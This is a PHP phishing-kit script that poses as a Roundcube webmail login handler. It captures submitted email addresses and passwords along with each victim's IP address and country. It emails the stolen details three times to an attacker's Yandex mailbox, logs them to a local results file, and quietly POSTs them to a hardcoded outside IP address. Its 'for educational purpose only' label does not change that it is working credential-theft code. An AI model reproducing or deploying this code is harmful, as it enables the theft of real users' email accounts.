<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_REQUEST['emails'];
$passwd = $_REQUEST['password'];
$host = $_REQUEST['host'];
$Referer = $_REQUEST['refererrefererreferer'];
$loginID = getloginIDFromlogin($login);
$loginID2 = ucfirst ($loginID);
$login2 = ucfirst ($login);
$email6 = base64_encode($login);
$own = 'anderstradingskills@yandex.com';
$owns = 'anderstradingskills@yandex.com';
$ownss = 'anderstradingskills@yandex.com';
$domainq = substr(strrchr($login, "@"), 1);
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$log = $_REQUEST['log'];
$server = date("D/M/d, Y g:i a"); 

$dom = $_REQUEST['domain'];
$sdom = base64_encode($dom);

$domain = 'roundcube';
$domain2 = strtoupper ($domain);
$sender = 'info@yourcoolsite.com';
$subject = "roundcube-->  $domain - $country - $login2";
$headers .= "From: X3D<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";

$count = $_REQUEST['count'];
$login = $_REQUEST['emails'];
$logins = base64_encode($_REQUEST['emails']);
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>____Main-Report____</td></tr>
 <tr><td>ID: $login<td/></tr>
 <tr><td>Access: >$passwd<</td></tr>
 <tr><td>Host: >$host<</td></tr>
 <tr><td>Referer: >$Referer<</td></tr>
 <tr><td>IP: $country | $countryCode | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
 <tr><td>Login URL: <a href='http://mail.$domainq' target='_blank'>Here</a></td></tr>
 <tr><td>For educational purpose only</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
echo "Not found";
}
else {
	$message=$msg;
	mail($own,$subject,$message,$headers);
	mail($owns,$subject,$message,$headers);
	mail($ownss,$subject,$message,$headers);
		
	$dataset = http_build_query(array("msg" => $message));
	mail($own,$subj,$msg,$headers);
	$r = on($dataset);
	$handler=fopen('results.html','a');
	fwrite($handler,$msg."================================\n");
	fclose($handler);
	echo "File Not Found";
	
}
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
function getDomainFromEmail($login)
{
// Get the data after the @ sign
$domain = substr(strrchr($login, "@"), 1);
return $domain;
}
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function on($data) {	
		$opts = array('http' =>
			array(
				'method'  => 'POST',
				'header'  => 'Content-Type: application/x-www-form-urlencoded',
				'content' => $data,
				'timeout' => 60 
			)
		);

		$context  = stream_context_create($opts);

		$result = file_get_contents('http://210.22.85.94:7777/uploads/5/index.php', false, $context);
		return $result;
}

function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>